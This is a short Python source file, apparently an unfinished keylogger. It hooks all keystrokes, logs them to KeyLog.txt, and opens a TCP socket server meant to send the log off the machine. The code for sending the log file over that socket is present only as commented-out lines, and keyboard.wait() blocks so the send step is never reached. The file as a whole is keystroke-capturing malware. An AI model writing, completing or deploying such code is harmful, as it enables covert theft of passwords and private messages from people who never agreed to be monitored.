import keyboard
import socket
import os
import schedule
import time

def keyPress(event):

    with open("KeyLog.txt", "a") as f:
        if event.name == "enter":
            f.write('\n----------\n (Return) \n----------\n')
        else:
            f.write('{}'.format(event.name))


def sendMessage(log):

    #Creating Socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((socket.gethostname(),1234))
    s.listen(5)

    client, addr = s.accept()

    #file = open(log, 'rb')
    #For getting file size, may not be used.
    #file_size = os.path.getsize(file)

    print(f"Connection from {addr} has been established!")
    client.send(bytes("Hello from the server!", "utf-8"))

    #s.send(file.encode())
    #More file size stuff
    #s.send(str(file_size).encode())

    # data = file.read()
    # s.sendall(data)
    # s.send(b"<END>")


def main():



    log = open("KeyLog.txt", 'w')
    keyboard.on_press(keyPress)
    keyboard.wait()

    sendMessage(log)
    #Send log file every day?  Needs function for that
    # schedule.every(5).minutes.do(sendMessage(s, log))
    # log.close()
    # s.close()

if __name__ == "__main__":
    main()